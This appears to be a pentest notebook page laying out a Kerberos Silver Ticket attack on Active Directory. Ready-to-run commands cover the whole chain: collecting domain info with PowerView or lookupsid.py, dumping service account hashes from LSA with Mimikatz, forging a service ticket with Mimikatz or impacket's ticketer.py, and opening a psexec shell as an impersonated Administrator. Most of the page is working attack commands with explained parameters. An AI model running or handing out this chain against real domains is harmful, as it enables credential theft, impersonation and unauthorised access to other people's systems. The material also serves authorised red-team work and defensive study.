# Silver Ticket

The **Silver ticket attack** involves the creation of a valid **Ticket Granding Service (TGS)** for a **specific service** when the password hash of the service is obtaned.\
This allows unauthorized access to the service by forging a customized TGS without create a auth connection with the Domain Controller.

**Required:&#x20;**<mark style="color:purple;">**Service account obtained and**</mark> [<mark style="color:purple;">**PtH**</mark>](../ad-lateral-movement/pass-the-hash.md) <mark style="color:purple;">**session**</mark>

#### Methodology:

* Get Domain Info
* Get a Service Account NTLM hash
* &#x20;Forge Silver Ticket



## Get Domain Info

{% code title="From Windows" %}
```powershell
. .\PowerView.ps1
Get-Domain # Domain Name
Get-DomainSID # Domain SID
```
{% endcode %}

{% code title="From Linux" %}
```bash
cd /usr/share/doc/python3-impacket/examples/ # Kali location
lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0
```
{% endcode %}



## Get a Service Account NTLM hash

### Invoke-Mimikatz.ps1

From obtained session from PtH:

Run the following commands to find the computer account password hash for the target machine

{% code overflow="wrap" %}
```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /inject"' -Computername $TARGET_NAME.local
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (111).png" alt="" width="563"><figcaption></figcaption></figure>



## Forge Silver Ticket

### Mimikatz (Windows)

Open another powershell terminal and run follow command:

{% code overflow="wrap" %}
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /domain:$DOMAIN.local /sid:$DOMAIN_SID /target:$DOMAIN_CONTROLLER /service:$SERVICE_NAME /rc4:$SERVICE_ACCOUNT_NTLM_HASH /user:$USER_TO_IMPERSONATE /ptt"'
```
{% endcode %}

> _example:_  `mimikatz.exe "kerberos::golden /admin:LukeSkywalker /id:1106 /domain:lab.adsecurity.org /sid:S-1-5-21-1473643419-774954089-2222329127 /target:adsmswin2k8r2.lab.adsecurity.org /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt"`

Params:

* **/domain** – the fully qualified domain name. In this example: “lab.adsecurity.org”.
* **/sid** – the SID of the domain. In this example: “S-1-5-21-1473643419-774954089-2222329127”.
* **/user** – username to impersonate (can be fake)
* **/ptt** – as an alternate to /ticket – use this to immediately inject the forged ticket into memory for use.
* **/id (optional)** – user RID. Mimikatz default is 500 (the default Administrator account RID).
* **/service** – the kerberos service running on the target server. This is the Service Principal Name class (or type) such as cifs, http, mssql.
* **/rc4** – the NTLM hash for the service (computer account or user account)
* **/target** – the target server’s FQDN.

### Ticketer.py (Linux)

This impacket script is usefull to forge a ticket with .**ccache output** file.

{% embed url="https://github.com/fortra/impacket/blob/master/examples/ticketer.py" %}

> Kali path: _/usr/share/doc/python3-impacket/examples_

{% code overflow="wrap" %}
```bash
python3 ticketer.py -spn $SPN_NAME -user-id 500 Administrator -nthash $PWD_HASH_ACCOUNT_OBTAINED -domain-sid $DOMAIN_SID -domain $DOMAIN.local
```
{% endcode %}

Check the tickets with `klist` command.

To set up the silver ticket for use, the **KRB5CCNAME** environment variable needs to be set to the path of the .ccache file, which can be an absolute or relative file path:

```
export KRB5CCNAME=Admnistrator.ccache
```

#### Use psexec with ticket to connect with compromised machine

```bash
psexec.py $DOMAIN.local/$Administrator@$TARGET_NAME -target-ip $TARGET_IP
-dc-ip $DC_IP -no-pass -k
# -no-pass: skip password-based authentication
# -k: kerberos ticket taken from the KRB5CCNAME env var
```











